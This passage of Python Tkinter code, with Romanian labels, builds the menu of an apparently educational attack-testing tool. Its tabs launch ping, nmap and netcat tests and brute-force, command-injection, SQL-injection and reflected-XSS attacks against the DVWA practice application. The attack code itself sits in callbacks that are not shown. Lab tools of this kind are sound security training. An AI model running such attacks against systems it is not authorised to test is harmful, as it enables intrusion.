        app,
        text = "TESTE ȘI ATACURI",
        font = font_attack_title
    )
    label_attacks.place(
        relx = 0.5,
        rely = 0.16,
        anchor = "center"
    )

    # The notebook separates the tests into two tabs: System and DVWA.
    style = ttk.Style()
    style.configure(
        "TNotebook.Tab",
        padding = [55, 10],
        font = font_tab
    )
    style.map(
        "TNotebook.Tab", 
        foreground = [("active", "black")]
    )

    notebook = ttk.Notebook(app)
    notebook.place(
        relx = 0.5,
        rely = 0.38,
        anchor = "center",
        relwidth = 0.20,
        relheight = 0.40
    )

    tab_system = tk.Frame(notebook)
    tab_dvwa = tk.Frame(notebook)

    notebook.add(tab_system, text = "Sistem")
    notebook.add(tab_dvwa, text = "DVWA")

    # The first tab contains the system-level tests.
    # Each row includes an information button, a run button, and a status indicator.
    info_ping, button_ping, status_ping = create_row(
        tab_system, 
        "PING", 
        0.19
    )
    info_ping.configure(
        command = lambda: show_attack_info("PING")
    )
    button_ping.configure(
        command = ping_callback
    )

    info_nmap, button_nmap, status_nmap = create_row(
        tab_system, 
        "NMAP", 
        0.31
    )
    info_nmap.configure(
        command = lambda: show_attack_info("NMAP")
    )
    button_nmap.configure(
        command = nmap_callback
    )

    info_netcat, button_netcat, status_netcat = create_row(
        tab_system, 
        "NETCAT", 
        0.43
    )
    info_netcat.configure(
        command = lambda: show_attack_info("NETCAT")
    )
    button_netcat.configure(
        command = netcat_callback
    )

# The second tab contains the web attacks executed against the DVWA application.
    info_brute_force, button_brute_force, status_brute_force = create_row(
        tab_dvwa, 
        "Brute Force", 
        0.19
    )
    info_brute_force.configure(
        command = lambda: show_attack_info("Brute Force")
    )    
    button_brute_force.configure(
        command = brute_force_callback
    )

    info_command_injection, button_command_injection, status_command_injection = create_row(
        tab_dvwa, 
        "Command Injection", 
        0.31
    )
    info_command_injection.configure(
        command = lambda: show_attack_info("Command Injection")
    )
    button_command_injection.configure(
        command = command_injection_callback
    )

    info_sql_injection, button_sql_injection, status_sql_injection = create_row(
        tab_dvwa, 
        "SQL Injection", 
        0.43
    )
    info_sql_injection.configure(
        command = lambda: show_attack_info("SQL Injection")
    )
    button_sql_injection.configure(
        command = sql_injection_callback
    )

    info_xss_reflected, button_xss_reflected, status_xss_reflected = create_row(
        tab_dvwa, 
        "XSS REFLECTED", 
        0.55
    )
    info_xss_reflected.configure(
        command = lambda: show_attack_info("XSS REFLECTED")
    )

    button_xss_reflected.configure(
        command = xss_reflected_callback
    )

    # Buttons under the notebook
    button_try = create_menu2_button(
        app, 
        "Încearcă!", 
        0.67, 
        open_windows_callback
    )

    button_info2 = create_menu2_button(
        app, 
        "Informații", 
        0.73, 
        show_attack_interface_info
    )

    button_reset = create_menu2_button(
        app, 
        "Șterge rezultate", 
        0.79, 
        reset_output
    )

    button_back = create_menu2_button(
        app, 
        "Înapoi", 
        0.85, 
        back_to_main_menu
    )

    button_exit2 = create_menu2_button(
        app, 
        "Ieșire", 
        0.91, 
        app.destroy
    )

# Start the main Tkinter window.
app = tk.Tk()
app.geometry("1900x1000")
# Show the first screen of the application.
main_interface()
# Keep the application open until the user closes it.
app.mainloop()